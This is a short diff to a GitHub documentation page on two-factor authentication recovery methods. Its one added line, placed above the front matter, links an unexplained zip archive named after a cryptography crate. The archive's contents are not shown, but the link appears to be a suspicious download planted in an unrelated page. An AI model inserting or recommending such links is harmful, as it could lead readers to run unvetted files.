@@ -1,3 +1,4 @@
+[curve25519-dalek-91a0faea35ee20f3b92470f88416ee6d4ccb15d9.zip](https://github.com/github/docs/files/8241384/curve25519-dalek-91a0faea35ee20f3b92470f88416ee6d4ccb15d9.zip)
 ---
 title: Configuring two-factor authentication recovery methods
 intro: You can set up a variety of recovery methods to access your account if you lose your two-factor authentication credentials.
